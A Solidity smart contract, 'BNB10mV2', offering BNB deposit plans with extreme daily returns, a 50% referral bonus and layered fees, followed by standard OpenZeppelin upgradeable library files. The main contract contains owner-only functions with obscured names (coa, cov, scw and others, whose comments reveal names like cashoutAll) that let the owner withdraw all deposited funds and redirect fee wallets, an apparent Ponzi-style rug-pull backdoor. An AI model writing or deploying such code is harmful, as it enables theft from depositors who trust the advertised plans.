// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}


contract BNB10mV2 is Initializable, OwnableUpgradeable {
    using SafeMath for uint256;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event WithdrawReferalsBonus(address indexed user, uint256 amount);
    event WithdrawDeposit(address indexed user, uint256 index, uint256 amount);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event FeePayedIn(address indexed user, uint256 totalAmount);
    event FeePayedOut(address indexed user, uint256 totalAmount);
    event InsurancePayed(address indexed user, uint256 totalAmount);
    event ReinvestDeposit(address indexed user, uint256 index, uint256 amount);


    uint256 public totalInvested;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

    struct Deposit {
        uint8 plan;
        uint256 amount;
        uint256 start;
        uint256 checkpoint;
    }

    struct Action {
        uint8 types;
        uint256 amount;
        uint256 date;
    }

    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        address referrer;
        uint256[5] levels;
        uint256 bonus;
        uint256 totalBonus;
        uint256 withdrawn;
        Action[] actions;
    }

    mapping(address => User) internal users;

    bool public started;
    address payable public commissionWallet;
    address payable public insuranceWallet;


    // uint256[] public REFERRAL_PERCENTS;
    uint256[] public REFERRAL_PERCENTS;
    uint256 public INVEST_MIN_AMOUNT;
    uint256 public INVEST_MAX_AMOUNT;
    uint256 public PROJECT_FEE;
    uint256 public PROJECT_FEE_OUT;
    uint256 public INSURANCE_FEE;
    uint256 public PERCENTS_DIVIDER;
    uint256 public TIME_STEP;
    uint8 private planCurrent;
    uint256 public counter4;

   
    // constructor() public {
    // function initialize() initializer public {
    //     __Ownable_init();

    //     // REFERRAL_PERCENTS = [70, 50, 30, 20, 10]; // 70 = 7%
    //     REFERRAL_PERCENTS = [500]; // 500 = 50%
    //     INVEST_MIN_AMOUNT = 1e16; // 0.01 bnb
    //     INVEST_MAX_AMOUNT = 1e16; // 0.01 bnb
    //     PROJECT_FEE = 50; // 50 = 5%
    //     PROJECT_FEE_OUT = 50; // 
    //     INSURANCE_FEE = 10; // 
    //     PERCENTS_DIVIDER = 1000;
    //     TIME_STEP = 1 days;
    //     planCurrent = 9; // start from 0

      
    //     commissionWallet = payable(msg.sender);
    //     insuranceWallet = payable(msg.sender);

    //     plans.push(Plan(1, 2000)); 
    //     plans.push(Plan(2, 1000)); 
    //     plans.push(Plan(3, 667)); 
    //     plans.push(Plan(4, 500)); 
    //     plans.push(Plan(5, 400)); 
    //     plans.push(Plan(6, 334)); 
    //     plans.push(Plan(7, 286)); 
    //     plans.push(Plan(8, 250)); 
    //     plans.push(Plan(9, 223)); 
    //     plans.push(Plan(10,200));  // 10 days, 200 = 20% per day
    // }

    function invest(address referrer) public payable {
        if (!started) {
            if (msg.sender == commissionWallet) {
                started = true;
            } else revert("Not started yet");
        }

        require(msg.value >= INVEST_MIN_AMOUNT, "fail min");
        require(msg.value <= INVEST_MAX_AMOUNT, "fail max");
        require(planCurrent < plans.length, "Invalid plan");

        if (PROJECT_FEE > 0 ) {
            uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
            commissionWallet.transfer(fee);
            emit FeePayedIn(msg.sender, fee);
        }
        if (INSURANCE_FEE > 0 ) {
            uint256 fee = msg.value.mul(INSURANCE_FEE).div(PERCENTS_DIVIDER);
            insuranceWallet.transfer(fee);
            emit InsurancePayed(msg.sender, fee);
        }

        User storage user = users[msg.sender];

        if (user.referrer == address(0)) {
            if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
                user.referrer = referrer;
            }

            address upline = user.referrer;
            for (uint256 i = 0; i < 5; i++) {
                if (upline != address(0)) {
                    users[upline].levels[i] = users[upline].levels[i].add(1);
                    upline = users[upline].referrer;
                } else break;
            }
        }

        if (user.referrer != address(0)) {
            address upline = user.referrer;
            for (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {
                if (upline != address(0)) {
                    uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    users[upline].bonus = users[upline].bonus.add(amount);
                    users[upline].totalBonus = users[upline].totalBonus.add(amount);
                    emit RefBonus(upline, msg.sender, i, amount);
                    upline = users[upline].referrer;
                } else break;
            }
        }

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(planCurrent, msg.value, block.timestamp, block.timestamp));
        user.actions.push(Action(0, msg.value, block.timestamp));

        totalInvested = totalInvested.add(msg.value);

        emit NewDeposit(msg.sender, planCurrent, msg.value);
    }

    function withdrawreferalsbonus() public {
        User storage user = users[msg.sender];
        uint256 referralBonus = getUserReferralBonus(msg.sender);
        uint256 contractBalance = address(this).balance;

        require(referralBonus > 0, "User has no referal payments");
        require(contractBalance > referralBonus , "No enought balance. Try later");

        if (referralBonus > 0) {
            user.bonus = 0;
        }
        user.withdrawn = user.withdrawn.add(referralBonus);

        payable(msg.sender).transfer(referralBonus);
        user.actions.push(Action(2, referralBonus, block.timestamp));
        emit WithdrawReferalsBonus(msg.sender, referralBonus);
    }

    function withdrawdeposit(uint256 index) public {
       
        User storage user = users[msg.sender];

        uint256 amount = getUserDepositProfit(msg.sender, index);
        require(amount > 0, "No deposit amount");
        
        uint256 finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
        if (finish > block.timestamp)
            user.deposits[index].checkpoint = block.timestamp; 
        else   
            user.deposits[index].checkpoint = finish; 

        user.withdrawn = user.withdrawn.add(amount);

        payable(msg.sender).transfer(amount);
        user.actions.push(Action(3, amount, block.timestamp));
        emit WithdrawDeposit(msg.sender, index, amount);

        if (PROJECT_FEE_OUT > 0 ) {
            uint256 fee = amount.mul(PROJECT_FEE_OUT).div(PERCENTS_DIVIDER);
            commissionWallet.transfer(fee);
            emit FeePayedIn(msg.sender, fee);
        }
    }

    function reinvestdeposit(uint256 index) public {
        // withdraw расчет =
        // 1) цифру "начислено" получить
        // 2) депозит "отнять"
        // 3) инвест новый "на сумму"
        User storage user = users[msg.sender];

        uint256 amount = getUserDepositProfit(msg.sender, index);
        require(amount > 0, "No deposit amount");
        
        uint256 finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
        if (finish > block.timestamp)
            user.deposits[index].checkpoint = block.timestamp; 
        else
            user.deposits[index].checkpoint = finish; 

        user.withdrawn = user.withdrawn.add(amount);

        user.actions.push(Action(4, amount, block.timestamp));

        


        // reinvest
        if (PROJECT_FEE_OUT > 0 ) {
            uint256 fee = amount.mul(PROJECT_FEE_OUT).div(PERCENTS_DIVIDER);
            commissionWallet.transfer(fee);
            emit FeePayedOut(msg.sender, fee);
        }

        if (PROJECT_FEE > 0 ) {
            uint256 fee = amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
            commissionWallet.transfer(fee);
            emit FeePayedIn(msg.sender, fee);
        }
        if (INSURANCE_FEE > 0 ) {
            uint256 fee = amount.mul(INSURANCE_FEE).div(PERCENTS_DIVIDER);
            insuranceWallet.transfer(fee);
            emit InsurancePayed(msg.sender, fee);
        }

        uint8 plan = 0;
        user.deposits.push(Deposit(plan, amount, block.timestamp, block.timestamp));
        user.actions.push(Action(0, amount, block.timestamp));

        totalInvested = totalInvested.add(amount);

        emit ReinvestDeposit(msg.sender, index, amount);

    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getPlanInfo() public view returns (uint256 time, uint256 percent) {
        time = plans[0].time;
        percent = plans[0].percent;
    }

    // function getUserDividends(address userAddress) public view returns (uint256) {
    //     User storage user = users[userAddress];
    //
    //     uint256 totalAmount;
    //
    //     for (uint256 i = 0; i < user.deposits.length; i++) {
    //         uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
    //         if (user.checkpoint < finish) {
    //             uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
    //             uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
    //             uint256 to = finish < block.timestamp ? finish : block.timestamp;
    //             if (from < to) {
    //                 totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
    //             }
    //         }
    //     }
    //
    //     return totalAmount;
    // }



    function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
        return users[userAddress].withdrawn;
    }

    function getUserCheckpoint(address userAddress) public view returns (uint256) {
        return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress) public view returns (address) {
        return users[userAddress].referrer;
    }

    function getUserDownlineCount(address userAddress) public view returns (uint256[5] memory referrals) {
        return (users[userAddress].levels);
    }

    function getUserTotalReferrals(address userAddress) public view returns (uint256) {
        return users[userAddress].levels[0] + users[userAddress].levels[1] + users[userAddress].levels[2] + users[userAddress].levels[3] + users[userAddress].levels[4];
    }

    function getUserReferralBonus(address userAddress) public view returns (uint256) {
        return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress) public view returns (uint256) {
        return users[userAddress].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress) public view returns (uint256) {
        return users[userAddress].totalBonus.sub(users[userAddress].bonus);
    }

    // function getUserAvailable(address userAddress) public view returns (uint256) {
    //     return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
    // }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint256 amount) {
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
            amount = amount.add(users[userAddress].deposits[i].amount);
        }
        return amount;
    }


    function getUserDepositsInfo(address userAddress) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory) {
       
        User storage user = users[userAddress];
       
        uint256[] memory index  = new uint256[](user.deposits.length);
        uint256[] memory start  = new uint256[](user.deposits.length);
        uint256[] memory finish = new uint256[](user.deposits.length);
        uint256[] memory checkpoint = new uint256[](user.deposits.length);
        uint256[] memory amount = new uint256[](user.deposits.length);
        uint256[] memory withdrawn = new uint256[](user.deposits.length);
        uint256[] memory profit = new uint256[](user.deposits.length);

        for (uint256 i=0; i< user.deposits.length; i++) {
            index[i]  = i;
            amount[i] = user.deposits[i].amount;
            start[i]  = user.deposits[i].start;
            checkpoint[i] = user.deposits[i].checkpoint;
            finish[i] = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
            uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER); 
            withdrawn[i] = share.mul(checkpoint[i].sub(start[i])).div(TIME_STEP); // сколько снято

            profit[i] = 0;
            if (checkpoint[i] < finish[i]) { // timestamp начисления - не позже finish = значит есть начисления
                // сколько начисления в день
                // uint256 share = amount[i].mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
                // timestamp откуда начислять
                uint256 from = start[i] > checkpoint[i] ? start[i] : checkpoint[i];
                // timestamp докуда начислять
                uint256 to = finish[i] < block.timestamp ? finish[i] : block.timestamp;
                // сумма начислений за дни (но примерная ж - или дробь?)
                if (from < to) {
                    profit[i] = share.mul(to.sub(from)).div(TIME_STEP);
                }
            }
        }

       
        return
        (
            index,
            start,
            checkpoint,
            finish,
            amount,
            withdrawn,
            profit
        );
    }

    function getUserDepositInfo(address userAddress, uint256 index) public view returns (uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish, uint256 checkpoint, uint256 withdrawn, uint256 profit) {
        // uint256 index = 0;
        User storage user = users[userAddress];

        plan = user.deposits[index].plan;
        percent = plans[plan].percent;
        amount = user.deposits[index].amount;
        start = user.deposits[index].start;
        finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
        checkpoint = user.deposits[index].checkpoint;
        uint256 share = user.deposits[index].amount.mul(plans[user.deposits[index].plan].percent).div(PERCENTS_DIVIDER); // сколько начисления в день
        withdrawn = share.mul(checkpoint.sub(start)).div(TIME_STEP); // сколько снято
        profit = 0;

        if (checkpoint < finish) { // timestamp начисления - не позже finish = значит есть начисления
            // timestamp откуда начислять
            uint256 from = user.deposits[index].start > user.deposits[index].checkpoint ? user.deposits[index].start : user.deposits[index].checkpoint;
            // timestamp докуда начислять
            uint256 to = finish < block.timestamp ? finish : block.timestamp;
            // сумма начислений за дни (но примерная ж - или дробь?)
            if (from < to) {
                profit = share.mul(to.sub(from)).div(TIME_STEP);
            }
        }
    }

    function getUserDepositProfit(address userAddress, uint256 index) public view returns (uint256) {
        // uint256 index = 0;
        User storage user = users[userAddress];

        uint256 plan = user.deposits[index].plan;
        uint256 percent = plans[plan].percent;
        uint256 amount = user.deposits[index].amount;
        uint256 start = user.deposits[index].start;
        uint256 finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
        uint256 checkpoint = user.deposits[index].checkpoint;
        uint256 profit = 0;

        if (checkpoint < finish) { // timestamp начисления - не позже finish = значит есть начисления
            // сколько начисления в день
            uint256 share = amount.mul(percent).div(PERCENTS_DIVIDER);
            // timestamp откуда начислять
            uint256 from = start > checkpoint ? start : checkpoint;
            // timestamp докуда начислять
            uint256 to = finish < block.timestamp ? finish : block.timestamp;
            // сумма начислений за дни (но примерная ж - или дробь?)
            if (from < to) {
                profit = share.mul(to.sub(from)).div(TIME_STEP);
            }
        }
        return profit;
    }

    function getUserActions(address userAddress, uint256 index) public view returns (uint8[] memory, uint256[] memory, uint256[] memory) {
        require(index > 0, "wrong index");
        User storage user = users[userAddress];
        uint256 start;
        uint256 end;
        uint256 cnt = 50;


        start = (index - 1) * cnt;
        if (user.actions.length < (index * cnt)) {
            end = user.actions.length;
        }
        else {
            end = index * cnt;
        }

        uint8[]   memory types = new  uint8[](end - start);
        uint256[] memory amount = new  uint256[](end - start);
        uint256[] memory date = new  uint256[](end - start);

        for (uint256 i = start; i < end; i++) {
            types[i - start] = user.actions[i].types;
            amount[i - start] = user.actions[i].amount;
            date[i - start] = user.actions[i].date;
        }
        return
        (
            types,
            amount,
            date
        );
    }





    function getUserActionLength(address userAddress) public view returns (uint256) {
        return users[userAddress].actions.length;
    }

    function getSiteInfo() public view returns (
        uint256 _totalInvested, 
        uint256 _refPercent,
        uint256 _INVEST_MIN_AMOUNT,
        uint256 _INVEST_MAX_AMOUNT
        ) 
    {
        return (
            totalInvested, 
            REFERRAL_PERCENTS[0],
            INVEST_MIN_AMOUNT,
            INVEST_MAX_AMOUNT
        );
    }

    function getUserInfo(address userAddress) public view returns (uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
        return (getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly {size := extcodesize(addr)}
        return size > 0;
    }



     // function setMinAmount(uint256 _value) public onlyOwner{
    function smna(uint256 _value) public onlyOwner{
        INVEST_MIN_AMOUNT = _value;
    }
    // function smxa(uint256 _value) public onlyOwner{
    function smxa(uint256 _value) public onlyOwner{
        INVEST_MAX_AMOUNT = _value;
    }


    // function setFeeIn(uint256 _value) public onlyOwner{
    function sfi(uint256 _value) public onlyOwner{
        PROJECT_FEE = _value;
    }
    // function setFeeOut(uint256 _value) public onlyOwner{
    function sfo(uint256 _value) public onlyOwner{
        PROJECT_FEE_OUT = _value;
    }
    // function setInsuranceFee(uint256 _value) public onlyOwner{
    function sif(uint256 _value) public onlyOwner{
        INSURANCE_FEE = _value;
    }

    // function setComissionWallet(address payable wallet) public onlyOwner {
    function scw(address payable wallet) public onlyOwner {
        commissionWallet = wallet;
    }
    // function setInsuranceWallet(address payable wallet) public onlyOwner {
    function siw(address payable wallet) public onlyOwner {
        insuranceWallet = wallet;
    }

    // function cashoutAll() public onlyOwner {
    function coa() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    // function cashoutValue(uint256 _value) public onlyOwner{
    function cov(uint256 _value) public onlyOwner{
        payable(msg.sender).transfer(_value);
    }

    // function SetReferalPercent(uint256 _value) public onlyOwner {
    function srp(uint256 _value) public onlyOwner {
        REFERRAL_PERCENTS[0] = _value;
    }

    // function getPlanCurrent() public view returns (uint256 percent) {
    function gpc() public view returns (uint256) {
        return planCurrent;
    }

    // function setPlanCurrent(uint256 _value) public onlyOwner {
    function spc(uint8 _value) public onlyOwner {
        planCurrent = _value;
    }

    function inc() public {
        // cntr++;
        counter4 = counter4 + 1;
    }

}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/ContextUpgradeable.sol";
import "../proxy/utils/Initializable.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function __Ownable_init() internal onlyInitializing {
        __Ownable_init_unchained();
    }

    function __Ownable_init_unchained() internal onlyInitializing {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[49] private __gap;
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (proxy/utils/Initializable.sol)

pragma solidity ^0.8.2;

import "../../utils/AddressUpgradeable.sol";

/**
 * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed
 * behind a proxy. Since proxied contracts do not make use of a constructor, it's common to move constructor logic to an
 * external initializer function, usually called `initialize`. It then becomes necessary to protect this initializer
 * function so it can only be called once. The {initializer} modifier provided by this contract will have this effect.
 *
 * The initialization functions use a version number. Once a version number is used, it is consumed and cannot be
 * reused. This mechanism prevents re-execution of each "step" but allows the creation of new initialization steps in
 * case an upgrade adds a module that needs to be initialized.
 *
 * For example:
 *
 * [.hljs-theme-light.nopadding]
 * ```
 * contract MyToken is ERC20Upgradeable {
 *     function initialize() initializer public {
 *         __ERC20_init("MyToken", "MTK");
 *     }
 * }
 * contract MyTokenV2 is MyToken, ERC20PermitUpgradeable {
 *     function initializeV2() reinitializer(2) public {
 *         __ERC20Permit_init("MyToken");
 *     }
 * }
 * ```
 *
 * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be called as early as
 * possible by providing the encoded function call as the `_data` argument to {ERC1967Proxy-constructor}.
 *
 * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer twice, or to ensure
 * that all initializers are idempotent. This is not verified automatically as constructors are by Solidity.
 *
 * [CAUTION]
 * ====
 * Avoid leaving a contract uninitialized.
 *
 * An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation
 * contract, which may impact the proxy. To prevent the implementation contract from being used, you should invoke
 * the {_disableInitializers} function in the constructor to automatically lock it when it is deployed:
 *
 * [.hljs-theme-light.nopadding]
 * ```
 * /// @custom:oz-upgrades-unsafe-allow constructor
 * constructor() {
 *     _disableInitializers();
 * }
 * ```
 * ====
 */
abstract contract Initializable {
    /**
     * @dev Indicates that the contract has been initialized.
     * @custom:oz-retyped-from bool
     */
    uint8 private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Triggered when the contract has been initialized or reinitialized.
     */
    event Initialized(uint8 version);

    /**
     * @dev A modifier that defines a protected initializer function that can be invoked at most once. In its scope,
     * `onlyInitializing` functions can be used to initialize parent contracts. Equivalent to `reinitializer(1)`.
     */
    modifier initializer() {
        bool isTopLevelCall = !_initializing;
        require(
            (isTopLevelCall && _initialized < 1) || (!AddressUpgradeable.isContract(address(this)) && _initialized == 1),
            "Initializable: contract is already initialized"
        );
        _initialized = 1;
        if (isTopLevelCall) {
            _initializing = true;
        }
        _;
        if (isTopLevelCall) {
            _initializing = false;
            emit Initialized(1);
        }
    }

    /**
     * @dev A modifier that defines a protected reinitializer function that can be invoked at most once, and only if the
     * contract hasn't been initialized to a greater version before. In its scope, `onlyInitializing` functions can be
     * used to initialize parent contracts.
     *
     * `initializer` is equivalent to `reinitializer(1)`, so a reinitializer may be used after the original
     * initialization step. This is essential to configure modules that are added through upgrades and that require
     * initialization.
     *
     * Note that versions can jump in increments greater than 1; this implies that if multiple reinitializers coexist in
     * a contract, executing them in the right order is up to the developer or operator.
     */
    modifier reinitializer(uint8 version) {
        require(!_initializing && _initialized < version, "Initializable: contract is already initialized");
        _initialized = version;
        _initializing = true;
        _;
        _initializing = false;
        emit Initialized(version);
    }

    /**
     * @dev Modifier to protect an initialization function so that it can only be invoked by functions with the
     * {initializer} and {reinitializer} modifiers, directly or indirectly.
     */
    modifier onlyInitializing() {
        require(_initializing, "Initializable: contract is not initializing");
        _;
    }

    /**
     * @dev Locks the contract, preventing any future reinitialization. This cannot be part of an initializer call.
     * Calling this in the constructor of a contract will prevent that contract from being initialized or reinitialized
     * to any version. It is recommended to use this to lock implementation contracts that are designed to be called
     * through proxies.
     */
    function _disableInitializers() internal virtual {
        require(!_initializing, "Initializable: contract is initializing");
        if (_initialized < type(uint8).max) {
            _initialized = type(uint8).max;
            emit Initialized(type(uint8).max);
        }
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;
import "../proxy/utils/Initializable.sol";

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract ContextUpgradeable is Initializable {
    function __Context_init() internal onlyInitializing {
    }

    function __Context_init_unchained() internal onlyInitializing {
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[50] private __gap;
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (utils/Address.sol)

pragma solidity ^0.8.1;

/**
 * @dev Collection of functions related to the address type
 */
library AddressUpgradeable {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly
                /// @solidity memory-safe-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}